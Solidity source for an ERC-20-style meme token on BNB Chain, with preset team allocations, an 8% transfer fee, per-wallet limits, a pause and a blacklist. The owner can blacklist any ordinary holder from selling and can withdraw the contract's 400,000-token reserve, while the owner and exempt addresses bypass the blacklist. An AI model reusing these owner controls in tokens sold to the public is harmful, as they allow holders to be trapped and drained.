// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title KCY1 Token (KCY-MEME-1)
 * @dev Enhanced version with:
 *      - Automatic initial distribution from DEV_WALLET_mm_vis
 *      - 4 exempt address slots (for team/marketing/advisors)
 *      - Exempt slot-to-normal transfer restrictions (100 tokens, 24h cooldown)
 *      - Fees (8%) apply when at least ONE party is normal
 *      - NO fees only when BOTH parties are exempt
 *      - Normal users: 1,000 token limit, 2h cooldown
 *      - Pause and Blacklist do NOT apply to exempt addresses
 * @author Production Version - Final v1.2
 */

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ReentrancyGuard {
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;
    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    modifier nonReentrant() {
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
        _status = _ENTERED;
        _;
        _status = _NOT_ENTERED;
    }
}

contract KCY1Token is IERC20, ReentrancyGuard {
    // Token metadata
    string public constant name = "KCY1";
    string public constant symbol = "KCY1";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    
    // Ownership and trading control
    address public immutable owner;
    uint256 public immutable tradingEnabledTime;
    
    // ====================================
    // AUTOMATIC DISTRIBUTION CONFIGURATION
    // ====================================
    
    // Development wallet (Main) - receives 600,000 tokens at deployment, distributes 500,000, keeps 100,000
    address private constant DEV_WALLET_mm_vis = 0x567c1c5e9026E04078F9b92DcF295A58355f60c7;
    
    // Marketing wallet - will receive 150,000 tokens from DEV_WALLET_mm_vis
    address private constant MARKETING_WALLET_tng = 0x58ec63d31b8e4D6624B5c88338027a54Be1AE28A;
    uint256 private constant MARKETING_ALLOCATION = 150_000 * 10**18;
    
    // Team wallet - will receive 200,000 tokens from DEV_WALLET_mm_vis
    address private constant TEAM_WALLET_trz_hdn = 0x6300811567bed7d69B5AC271060a7E298f99fddd;
    uint256 private constant TEAM_ALLOCATION = 200_000 * 10**18;
    
    // Advisor wallet - will receive 150,000 tokens from DEV_WALLET_mm_vis
    address private constant ADVISOR_WALLET_trz_vis = 0x8d95d56436Eb58ee3f9209e8cc4BfD59cfBE8b87;
    uint256 private constant ADVISOR_ALLOCATION = 150_000 * 10**18;
    
    // Total to distribute from DEV_WALLET_mm_vis: 500,000 tokens
    // Remaining in DEV_WALLET_mm_vis after distribution: 100,000 tokens
    uint256 private constant TOTAL_DISTRIBUTION = 500_000 * 10**18;
    
    // Distribution state
    bool public initialDistributionCompleted;
    
    // ====================================
    // Rest of contract variables
    // ====================================
    
    // Fee structure (in basis points, 1 bp = 0.01%)
    uint256 public constant BURN_FEE = 300;  // 3% burn
    uint256 public constant OWNER_FEE = 500; // 5% to owner
    uint256 public constant FEE_DENOMINATOR = 10000;
    
    // Transaction limits
    uint256 public constant MAX_TRANSACTION = 1000 * 10**18;
    uint256 public constant MAX_WALLET = 20000 * 10**18;
    uint256 public constant COOLDOWN_PERIOD = 2 hours;
    uint256 public constant PAUSE_DURATION = 48 hours;
    
    // NEW: Exempt to Normal address restrictions
    uint256 public constant MAX_EXEMPT_TO_NORMAL = 100 * 10**18;  // 100 tokens max
    uint256 public constant EXEMPT_TO_NORMAL_COOLDOWN = 24 hours;  // 24 hour cooldown
    
    // Pause mechanism
    uint256 public pausedUntil;
    
    // Exempt addresses (4 slots)
    address public exemptAddress1;
    address public exemptAddress2;
    address public exemptAddress3;
    address public exemptAddress4;
    
    // DEX addresses
    address public pancakeswapRouter;
    address public pancakeswapFactory;
    
    // Lock mechanism
    bool public exemptAddressesLocked;
    
    // Mappings
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    mapping(address => uint256) public lastTransactionTime;
    mapping(address => uint256) public lastExemptToNormalTime;  // NEW: Track exempt->normal transfers
    mapping(address => bool) public isBlacklisted;
    
    // Events
    event TokensBurned(uint256 amount);
    event Paused(uint256 until);
    event Blacklisted(address indexed account, bool status);
    event ExemptAddressesUpdated(address[4] addresses, address router, address factory);
    event ExemptAddressesLocked();
    event EmergencyTokensRescued(address indexed token, uint256 amount);
    event BNBWithdrawn(uint256 amount);
    event InitialDistributionCompleted(uint256 totalDistributed);
    event DistributionSent(address indexed recipient, uint256 amount);
    
    // Modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    modifier whenNotPaused() {
        require(!isPaused(), "Contract is paused");
        _;
    }
    
    modifier whenNotLocked() {
        require(!exemptAddressesLocked, "Exempt addresses are locked forever");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        tradingEnabledTime = block.timestamp + 48 hours;
        totalSupply = 1_000_000 * 10**decimals;
        
        // Initial distribution: 60% to DEV_WALLET_mm_vis, 40% to contract
        balanceOf[DEV_WALLET_mm_vis] = 600_000 * 10**decimals;
        balanceOf[address(this)] = 400_000 * 10**decimals;
        
        // Initialize PancakeSwap addresses (BSC Mainnet)
        pancakeswapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        pancakeswapFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        
        // Exempt addresses start empty (4 slots)
        exemptAddress1 = address(0);
        exemptAddress2 = address(0);
        exemptAddress3 = address(0);
        exemptAddress4 = address(0);
        
        emit Transfer(address(0), DEV_WALLET_mm_vis, 600_000 * 10**decimals);
        emit Transfer(address(0), address(this), 400_000 * 10**decimals);
    }
    
    /**
     * @dev AUTOMATIC DISTRIBUTION FUNCTION
     * Distributes tokens from DEV_WALLET_mm_vis to preset wallets
     * Can only be called once by owner
     * Distributes 500,000 tokens total, leaving 100,000 in DEV_WALLET_mm_vis
     */
    function distributeInitialAllocations() external onlyOwner {
        require(!initialDistributionCompleted, "Distribution already completed");
        require(balanceOf[DEV_WALLET_mm_vis] >= TOTAL_DISTRIBUTION, "Insufficient DEV_WALLET_mm_vis balance");
        
        // Mark as completed first to prevent reentrancy
        initialDistributionCompleted = true;
        
        // Distribute to Marketing Wallet
        if (MARKETING_WALLET_tng != address(0) && MARKETING_ALLOCATION > 0) {
            balanceOf[DEV_WALLET_mm_vis] -= MARKETING_ALLOCATION;
            balanceOf[MARKETING_WALLET_tng] += MARKETING_ALLOCATION;
            emit Transfer(DEV_WALLET_mm_vis, MARKETING_WALLET_tng, MARKETING_ALLOCATION);
            emit DistributionSent(MARKETING_WALLET_tng, MARKETING_ALLOCATION);
        }
        
        // Distribute to Team Wallet
        if (TEAM_WALLET_trz_hdn != address(0) && TEAM_ALLOCATION > 0) {
            balanceOf[DEV_WALLET_mm_vis] -= TEAM_ALLOCATION;
            balanceOf[TEAM_WALLET_trz_hdn] += TEAM_ALLOCATION;
            emit Transfer(DEV_WALLET_mm_vis, TEAM_WALLET_trz_hdn, TEAM_ALLOCATION);
            emit DistributionSent(TEAM_WALLET_trz_hdn, TEAM_ALLOCATION);
        }
        
        // Distribute to Advisor Wallet
        if (ADVISOR_WALLET_trz_vis != address(0) && ADVISOR_ALLOCATION > 0) {
            balanceOf[DEV_WALLET_mm_vis] -= ADVISOR_ALLOCATION;
            balanceOf[ADVISOR_WALLET_trz_vis] += ADVISOR_ALLOCATION;
            emit Transfer(DEV_WALLET_mm_vis, ADVISOR_WALLET_trz_vis, ADVISOR_ALLOCATION);
            emit DistributionSent(ADVISOR_WALLET_trz_vis, ADVISOR_ALLOCATION);
        }
        
        // DEV_WALLET_mm_vis keeps the remaining 100,000 tokens automatically
        // No need to transfer to itself
        
        emit InitialDistributionCompleted(TOTAL_DISTRIBUTION);
    }
    
    function isExemptAddress(address account) public view returns (bool) {
        return account == owner ||
               account == address(this) ||
               account == exemptAddress1 ||
               account == exemptAddress2 ||
               account == exemptAddress3 ||
               account == exemptAddress4 ||
               account == pancakeswapRouter ||
               account == pancakeswapFactory;
    }
    
    function updateExemptAddresses(
        address[4] memory addresses,
        address router,
        address factory
    ) external onlyOwner whenNotLocked {
        require(router != address(0), "Router cannot be zero address");
        require(factory != address(0), "Factory cannot be zero address");
        
        exemptAddress1 = addresses[0];
        exemptAddress2 = addresses[1];
        exemptAddress3 = addresses[2];
        exemptAddress4 = addresses[3];
        pancakeswapRouter = router;
        pancakeswapFactory = factory;
        
        emit ExemptAddressesUpdated(addresses, router, factory);
    }
    
    function lockExemptAddressesForever() external onlyOwner whenNotLocked {
        exemptAddressesLocked = true;
        emit ExemptAddressesLocked();
    }
    
    function isPaused() public view returns (bool) {
        return block.timestamp < pausedUntil;
    }
    
    function pause() external onlyOwner {
        require(pausedUntil <= block.timestamp, "Already paused");
        pausedUntil = block.timestamp + PAUSE_DURATION;
        emit Paused(pausedUntil);
    }
    
    function setBlacklist(address account, bool status) external onlyOwner {
        require(account != owner, "Cannot blacklist owner");
        require(account != address(this), "Cannot blacklist contract");
        require(account != address(0), "Cannot blacklist zero address");
        
        isBlacklisted[account] = status;
        emit Blacklisted(account, status);
    }
    
    function setBlacklistBatch(address[] calldata accounts, bool status) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            if (accounts[i] != owner && 
                accounts[i] != address(this) && 
                accounts[i] != address(0)) {
                isBlacklisted[accounts[i]] = status;
                emit Blacklisted(accounts[i], status);
            }
        }
    }
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "Insufficient allowance");
        
        unchecked {
            allowance[from][msg.sender] = currentAllowance - amount;
        }
        
        return _transfer(from, to, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(from != address(0), "Transfer from zero address");
        require(to != address(0), "Transfer to zero address");
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        bool fromExempt = isExemptAddress(from);
        bool toExempt = isExemptAddress(to);
        
        // Pause check - only for non-exempt addresses
        if (!fromExempt && !toExempt) {
            require(!isPaused(), "Contract is paused");
        }
        
        // Blacklist check - only for non-exempt addresses
        if (!fromExempt) {
            require(!isBlacklisted[from], "Sender is blacklisted");
        }
        if (!toExempt) {
            require(!isBlacklisted[to], "Recipient is blacklisted");
        }
        
        // NEW: Check exempt slot to normal restrictions (ONLY for the 4 slots, NOT Router/Factory)
        // This ensures only the 4 exempt slots have the 100 token limit when sending to normal users
        // Router/Factory are exempt for fees but NOT restricted by this 100 token limit
        bool isSlotExempt = (from == exemptAddress1 || from == exemptAddress2 || 
                             from == exemptAddress3 || from == exemptAddress4);
        
        if (isSlotExempt && !toExempt) {
            // One of the 4 exempt slots sending to normal address
            require(amount <= MAX_EXEMPT_TO_NORMAL, "Exempt slot to normal: exceeds 100 token limit");
            
            uint256 lastExemptTx = lastExemptToNormalTime[from];
            if (lastExemptTx != 0) {
                require(
                    block.timestamp >= lastExemptTx + EXEMPT_TO_NORMAL_COOLDOWN,
                    "Exempt slot to normal: must wait 24 hours between transfers"
                );
            }
        }
        
        // Original trading lock check (only for normal users)
        if (!fromExempt) {
            // Normal users cannot trade during lock period (unless sending to exempt)
            if (!toExempt) {
                require(block.timestamp >= tradingEnabledTime, "Trading locked for 48h");
            }
        }
        
        // Transaction limits for normal users (both normal→normal AND normal→exempt)
        if (!fromExempt) {
            require(amount <= MAX_TRANSACTION, "Exceeds max transaction (1000 tokens)");
            
            // Wallet limit only for normal→normal (not when sending to exempt addresses like Router)
            if (!toExempt) {
                uint256 recipientBalance = balanceOf[to];
                require(
                    recipientBalance + amount <= MAX_WALLET,
                    "Recipient would exceed max wallet (20,000 tokens)"
                );
            }
            
            // Cooldown for all normal user transactions
            uint256 lastTx = lastTransactionTime[from];
            if (lastTx != 0) {
                require(
                    block.timestamp >= lastTx + COOLDOWN_PERIOD,
                    "Must wait 2 hours between transactions"
                );
            }
        }
        
        // Execute transfer with or without fees
        // NO FEES: ONLY when BOTH are exempt
        // HAS FEES: When at least ONE is normal
        
        if (fromExempt && toExempt) {
            // Both exempt: No fees
            unchecked {
                balanceOf[from] -= amount;
                balanceOf[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            // At least one is normal: Apply fees (8% = 3% burn + 5% owner)
            uint256 burnAmount = (amount * BURN_FEE) / FEE_DENOMINATOR;
            uint256 ownerAmount = (amount * OWNER_FEE) / FEE_DENOMINATOR;
            uint256 transferAmount = amount - burnAmount - ownerAmount;
            
            unchecked {
                balanceOf[from] -= amount;
                balanceOf[to] += transferAmount;
                balanceOf[owner] += ownerAmount;
                totalSupply -= burnAmount;
            }
            
            emit Transfer(from, to, transferAmount);
            emit Transfer(from, owner, ownerAmount);
            emit Transfer(from, address(0), burnAmount);
            emit TokensBurned(burnAmount);
        }
        
        // Update cooldown timer for normal users
        if (!fromExempt) {
            lastTransactionTime[from] = block.timestamp;
        }
        
        // NEW: Update exempt slot to normal cooldown timer (ONLY for the 4 slots)
        if (isSlotExempt && !toExempt) {
            lastExemptToNormalTime[from] = block.timestamp;
        }
        
        return true;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, allowance[msg.sender][spender] + addedValue);
        return true;
    }
    
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        uint256 currentAllowance = allowance[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "Decreased allowance below zero");
        unchecked {
            _approve(msg.sender, spender, currentAllowance - subtractedValue);
        }
        return true;
    }
    
    function _approve(address tokenOwner, address spender, uint256 amount) internal {
        require(tokenOwner != address(0), "Approve from zero address");
        require(spender != address(0), "Approve to zero address");
        
        allowance[tokenOwner][spender] = amount;
        emit Approval(tokenOwner, spender, amount);
    }
    
    function withdrawCirculationTokens(uint256 amount) external onlyOwner {
        require(balanceOf[address(this)] >= amount, "Insufficient contract balance");
        
        unchecked {
            balanceOf[address(this)] -= amount;
            balanceOf[owner] += amount;
        }
        
        emit Transfer(address(this), owner, amount);
    }
    
    function burn(uint256 amount) external onlyOwner {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        
        unchecked {
            balanceOf[msg.sender] -= amount;
            totalSupply -= amount;
        }
        
        emit Transfer(msg.sender, address(0), amount);
        emit TokensBurned(amount);
    }
    
    function isTradingEnabled() public view returns (bool) {
        return block.timestamp >= tradingEnabledTime;
    }
    
    function timeUntilTradingEnabled() public view returns (uint256) {
        if (isTradingEnabled()) return 0;
        return tradingEnabledTime - block.timestamp;
    }
    
    function timeUntilUnpaused() public view returns (uint256) {
        if (!isPaused()) return 0;
        return pausedUntil - block.timestamp;
    }
    
    function getExemptAddresses() external view returns (
        address[4] memory addresses,
        address router,
        address factory,
        bool locked
    ) {
        addresses[0] = exemptAddress1;
        addresses[1] = exemptAddress2;
        addresses[2] = exemptAddress3;
        addresses[3] = exemptAddress4;
        router = pancakeswapRouter;
        factory = pancakeswapFactory;
        locked = exemptAddressesLocked;
    }
    
    function rescueTokens(address tokenAddress, uint256 amount) external onlyOwner nonReentrant {
        require(tokenAddress != address(0), "Invalid token address");
        require(tokenAddress != address(this), "Cannot rescue own KCY1 tokens");
        
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(owner, amount), "Rescue transfer failed");
        
        emit EmergencyTokensRescued(tokenAddress, amount);
    }
    
    receive() external payable {}
    
    function withdrawBNB() external onlyOwner nonReentrant {
        uint256 balance = address(this).balance;
        require(balance > 0, "No BNB to withdraw");
        
        (bool success, ) = payable(owner).call{value: balance}("");
        require(success, "BNB transfer failed");
        
        emit BNBWithdrawn(balance);
    }
}
